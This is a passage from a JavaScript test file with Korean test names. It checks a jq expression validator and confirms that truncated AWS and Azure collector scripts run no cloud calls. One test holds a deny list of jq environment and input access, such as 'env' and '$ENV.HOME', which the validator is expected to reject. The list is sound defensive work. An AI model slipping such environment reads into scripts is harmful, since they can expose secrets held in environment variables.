    expect(comments.map((c) => [c.inline, c.text])).toEqual([[false, "# 줄 전체"], [true, "# 행 끝"]]);
  });
});

describe("jq 검사기(L-13)", () => {
  it("else 없는 if는 잡고 elif 사슬의 마지막 else는 받는다", () => {
    expect(checkJq("if .a then 1 end").map((i) => i.code)).toEqual(["if-without-else"]);
    expect(checkJq("if .a then 1 elif .b then 2 else 3 end")).toEqual([]);
    expect(checkJq("if .a then (if .b then 1 else 2 end) end").map((i) => i.code)).toEqual(["if-without-else"]);
    expect(checkJq("if .a then 1 else 2 end | if .b then 1 else 2 end")).toEqual([]);
  });
  it("문자열 안의 if·필드 이름·객체 키는 키워드·내장 함수로 보지 않는다", () => {
    expect(checkJq('{if: 1, pick: 2} | .trim | "if without else" | {abs: .x}')).toEqual([]);
    expect(checkJq('"a \\(if .x then 1 end) b"').map((i) => i.code)).toEqual(["if-without-else"]);
  });
  it("jq 1.7+ 내장 함수와 환경·입력 접근을 잡는다", () => {
    for (const p of ["pick(.a)", "abs", "toarray", "trim", "ltrim", "rtrim", "have_decnum", "have_literal_numbers", "@base32d", "$__loc__", "scan(\"a\"; \"g\")", "add(.a)"]) expect(checkJq(p).length, p).toBeGreaterThan(0);
    for (const p of ["env", "$ENV.HOME", "input", "inputs", "debug", "stderr", "input_filename", "halt_error"]) expect(checkJq(p).map((i) => i.code), p).toContain("jq-denied");
  });
  it("수집기가 실제로 쓰는 jq 1.6 내장 함수는 통과한다", () => {
    expect(checkJq('[.[] | select(.a // "" | test("^x")) | {n: (.b | ltrimstr(".") | split(".") | last), m: (.c | @base64d), k: (.d | to_entries | map(.key) | sort | unique | length)}] | with_entries(select(.value != null)) | any(. == 1)')).toEqual([]);
  });
});

describe("부분 복붙 안전성: 잘린 스크립트는 아무것도 실행하지 않는다", () => {
  for (const cloud of CLOUDS) {
    const scenario = cloud === "aws" ? awsBase() : azureBase();
    it(`${cloud}: 함수 한가운데서 잘리면 문법 오류로 끝나고 클라우드 호출 0건·파일 없음`, () => {
      const lines = SRC[cloud].split("\n");
      const at = lines.findIndex((l) => l.includes("elif ! jq -c"));
      expect(at).toBeGreaterThan(0);
      const r = runCollector({ cloud, scenario, args: ["--yes"], scriptText: lines.slice(0, at + 1).join("\n") });
      expect(r.status).not.toBe(0);
      expect(r.stderr).toContain("syntax error");
      expect(r.calls).toHaveLength(0);
      expect(r.outputName).toBeNull();
    });
    it(`${cloud}: 어느 줄에서 잘려도 클라우드 호출은 0건이다(함수 정의 밖에는 실행문이 main뿐)`, () => {
      const lines = SRC[cloud].split("\n");
      for (const frac of [0.2, 0.45, 0.6, 0.8, 0.95]) {
        const r = runCollector({ cloud, scenario, args: ["--yes"], scriptText: lines.slice(0, Math.floor(lines.length * frac)).join("\n") });
        expect(r.calls, `${frac}`).toHaveLength(0);
        expect(r.outputName, `${frac}`).toBeNull();
      }
    });
    it(`${cloud}: 마지막 줄(main "$@")만 빠져도 함수 정의뿐이라 아무것도 실행되지 않는다`, () => {
      const r = runCollector({ cloud, scenario, args: ["--yes"], scriptText: SRC[cloud].replace(/main "\$@"\n$/, "") });
      expect(r.calls).toHaveLength(0);
      expect(r.outputName).toBeNull();
      expect(r.stdout).toBe("");
    });
  }
});
